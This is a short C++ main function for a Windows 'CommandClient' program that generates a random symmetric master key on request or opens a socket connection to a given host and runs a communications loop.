#include "CommandClient.hpp"

int __cdecl main(int argc, char** argv)
{
    if (argc == 1)//DEBUG
    {
        char def[10];
        std::memcpy(def, "localhost", sizeof("localhost"));
        argc++;
        argv[1] = def;
    }
    else if(strcmp(argv[1], "getkey") == 0)//to generate new symmetric master key
    {
        HCRYPTPROV hCryptProv;

        CryptAcquireContext(
            &hCryptProv,
            NULL,
            (LPCWSTR)L"Microsoft Base Cryptographic Provider v1.0",
            PROV_RSA_FULL,
            CRYPT_VERIFYCONTEXT);

        unsigned char keyMaster[DEFAULT_KEY];

        CryptGenRandom(hCryptProv, DEFAULT_KEY, keyMaster);

        DebugChar(reinterpret_cast<char*>(keyMaster), DEFAULT_KEY);
        int in;
        std::cin >> in;
        return 0;
    }

    SOCKET ConnectSocket = INVALID_SOCKET;
    if (Connect_Init(argc, argv, ConnectSocket))//1 = error; 0 = good
    {
        std::cout << "\n[!]Init Failed...";
        return 0;
    }

    Connect_Accept(ConnectSocket, argv[1]);//comms loop

    return 0;
}